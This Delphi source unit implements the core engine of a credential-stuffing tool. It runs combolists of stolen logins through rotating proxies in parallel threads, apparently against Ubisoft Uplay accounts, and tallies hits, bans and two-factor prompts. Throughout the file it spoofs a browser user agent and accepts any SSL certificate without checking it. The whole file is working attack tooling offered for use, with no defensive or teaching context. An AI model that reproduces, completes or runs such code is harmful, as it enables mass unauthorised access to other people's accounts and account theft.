unit uBruteforcer;

interface

uses Classes, ExtCtrls, uCombolist, uProxylist, uTypes, uThread;

type

  TBruteforceEngine = class(TObject)
  protected
    FAbort: boolean;
    FStopped: boolean;
    FThreadCount: Integer;
    FThreadMax: Integer;
    FComboList: TCombolist;
    FProxyList: TProxylist;
    FThreads: Array of TBotThread;
    FProxyType: Integer;
    FUpdateFromAPI: boolean;
    FApiUrl: string;
    FInterval: Integer;
    FTimer: TTimer;
    FTimeout: Integer;
    FPosition: Integer;
    FStatistics: PStatistics;
    FSettings: PBruteforceSettings;
    FOnEngineStart: TNotifyEvent;
    FOnEngineComplete: TNotifyEvent;
    FOnUpdateStatistics: TNotifyEvent;
    procedure TriggerEngineStart;
    procedure TriggerEngineComplete;
    procedure TriggerUpdateStatistics;
    procedure ThreadComplete(Sender: TObject);
    procedure ThreadCheckerDone(Sender: TObject);
    function GetThreads: TList;
    procedure FinalizeEngine;
    procedure CreateThread;
    procedure CreateAllThreads;
    procedure TimerProxyProc(Sender: TObject);
    procedure ipwHTTP1SSLServerAuthentication(Sender: TObject;
      CertEncoded: string; CertEncodedB: TArray<System.Byte>;
      const CertSubject, CertIssuer, Status: string; var Accept: boolean);
  public
    procedure HardAbort;
    procedure InitializeEngine;
    procedure StartBruteforce;
    procedure StopBruteforce;
    property Abort: boolean read FAbort write FAbort;
    property ThreadCount: Integer read FThreadCount write FThreadCount;
    property ThreadMax: Integer read FThreadMax write FThreadMax;
    property Stopped: boolean read FStopped write FStopped;
    property ComboList: TCombolist read FComboList write FComboList;
    property ProxyList: TProxylist read FProxyList write FProxyList;
    property Threads: TList read GetThreads;
    property ProxyType: Integer read FProxyType write FProxyType;
    property Timeout: Integer read FTimeout write FTimeout;
    property Position: Integer read FPosition write FPosition;
    property UpdateFromAPI: boolean read FUpdateFromAPI write FUpdateFromAPI;
    property ApiUrl: string read FApiUrl write FApiUrl;
    property Interval: Integer read FInterval write FInterval;
    property Timer: TTimer read FTimer write FTimer;
    property Statistics: PStatistics read FStatistics write FStatistics;
    property Settings: PBruteforceSettings read FSettings write FSettings;
    property OnEngineStart: TNotifyEvent read FOnEngineStart
      write FOnEngineStart;
    property OnEngineComplete: TNotifyEvent read FOnEngineComplete
      write FOnEngineComplete;
    property OnUpdateStatistics: TNotifyEvent read FOnUpdateStatistics
      write FOnUpdateStatistics;
  end;

implementation

uses Windows, SysUtils, DateUtils, uFrmMain, uFunctions, ipwhttp,
  uUplayBruteProc;

{ TBruteforceEngine }

procedure TBruteforceEngine.CreateAllThreads;
begin
  try
    while (FThreadCount < FThreadMax) and
      (FSettings.Position < FComboList.Count) do
      CreateThread;
  except
    On E: Exception do
      raise Exception.Create(E.Message);
  end;
end;

procedure TBruteforceEngine.CreateThread;
var
  T: TBotThread;
begin
  T := TBotThread.Create(True);
  T.ID := FThreadCount;
  T.ComboList := FComboList;
  T.ProxyList := FProxyList;
  T.ProxyType := FProxyType;
  T.BotProc := UplayBruteProc;
  T.Settings := FSettings;
  T.Timeout := FTimeout;
  T.Statistics := FStatistics;
  T.OnComboChecked := ThreadCheckerDone;
  T.OnTerminate := ThreadComplete;

  FThreads[FThreadCount] := T;

  T.Resume;

  Inc(FThreadCount);
end;

procedure TBruteforceEngine.FinalizeEngine;
begin
  FAbort := True;
  SetLength(FThreads, 0);
  DeleteCriticalSection(FSettings.LockCombo);
  DeleteCriticalSection(FSettings.LockProxy);
  DeleteCriticalSection(FSettings.LockCheck);
  DeleteCriticalSection(FSettings.LockStatus);
  Dispose(FSettings);
  Dispose(FStatistics);

  if FUpdateFromAPI then
  begin
    FTimer.Enabled := False;
    FreeAndNil(FTimer);
  end;

  FStopped := True;
end;

function TBruteforceEngine.GetThreads: TList;
var
  I: Integer;
begin
  Result := TList.Create;
  for I := 0 to FThreadCount do
    Result.Add(FThreads[I]);
end;

procedure TBruteforceEngine.HardAbort;
var
  I: Integer;
begin
  for I := 0 to ThreadCount - 1 do
    FThreads[I].Terminate;
end;

procedure TBruteforceEngine.InitializeEngine;
begin
  New(FStatistics);
  New(FSettings);

  FAbort := False;
  FThreadCount := 0;
  SetLength(FThreads, FThreadMax);

  with FStatistics^ do
  begin
    Tested := 0;
    Bad := 0;
    Hit := 0;
    Free := 0;
    Ban := 0;
    Retry := 0;
    Uknown := 0;
    TwoFa := 0;
    CPM := 0;
  end;

  with FSettings^ do
  begin
    Position := FPosition;
    ProxyPosition := -1;
    ResultDir := MainForm.StrLocPath + 'Result\' + DateTimeAsString(Now) + '\';
    StartTime := GetTickCount64;
  end;
  InitializeCriticalSection(FSettings.LockCombo);
  InitializeCriticalSection(FSettings.LockProxy);
  InitializeCriticalSection(FSettings.LockCheck);
  InitializeCriticalSection(FSettings.LockStatus);

  CreateDir(FSettings.ResultDir);

  if FUpdateFromAPI then
  begin
    FTimer := TTimer.Create(nil);
    FTimer.OnTimer := TimerProxyProc;
    FTimer.Interval := FInterval;
    FTimer.Enabled := True;
  end;

  if FUpdateFromAPI then
    TimerProxyProc(nil);
end;

procedure TBruteforceEngine.ipwHTTP1SSLServerAuthentication(Sender: TObject;
  CertEncoded: string; CertEncodedB: TArray<System.Byte>;
  const CertSubject, CertIssuer, Status: string; var Accept: boolean);
begin
  Accept := True;
end;

procedure TBruteforceEngine.StartBruteforce;
begin
  CreateAllThreads;
  TriggerEngineStart;
end;

procedure TBruteforceEngine.StopBruteforce;
begin
  FAbort := True;
end;

procedure TBruteforceEngine.ThreadCheckerDone(Sender: TObject);
var
  T: TBotThread;
begin
  T := Sender as TBotThread;
  if FAbort then
    T.Terminate;
  FPosition := FSettings.Position;
  TriggerUpdateStatistics;
end;

procedure TBruteforceEngine.ThreadComplete(Sender: TObject);
begin
  Dec(FThreadCount);
  if FThreadCount = 0 then
    TriggerEngineComplete;
end;

procedure TBruteforceEngine.TimerProxyProc(Sender: TObject);
var
  Http: TipwHTTP;
  StrList: TStringList;
begin
  Http := TipwHTTP.Create(nil);
  Http.Config('UserAgent=Mozilla/5.0 (Windows NT 10.0; Win6' +
    '4; x64; rv:90.0) Gecko/20100101 Firefox/90.0');
  Http.OtherHeaders := 'Accept: */*'#13#10 +
    'Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3';
  Http.OnSSLServerAuthentication := ipwHTTP1SSLServerAuthentication;
  Http.Timeout := 10;
  StrList := TStringList.Create;
  try
    Http.Get(FApiUrl);
    StrList.Text := Http.TransferredData;
    EnterCriticalSection(FSettings.LockProxy);
    try
      FProxyList.Clear;
      FProxyList.LoadFromStrings(StrList);
      if FProxyList.Count = 0 then
        FAbort := True; // stops the engine without exception
    finally
      LeaveCriticalSection(FSettings.LockProxy);
    end;
  finally
    Http.Free;
    StrList.Free;
  end;

  if FProxyList.Count = 0 then
    raise Exception.Create('Couldn''t Load Proxies From API: ' + FApiUrl);
end;

procedure TBruteforceEngine.TriggerEngineComplete;
begin
  if Assigned(FOnEngineComplete) then
    FOnEngineComplete(Self);
  FinalizeEngine;
end;

procedure TBruteforceEngine.TriggerEngineStart;
begin
  if Assigned(FOnEngineStart) then
    FOnEngineStart(Self);
  FStopped := False;
end;

procedure TBruteforceEngine.TriggerUpdateStatistics;
begin
  if Assigned(FOnUpdateStatistics) then
    FOnUpdateStatistics(Self);
end;

end.
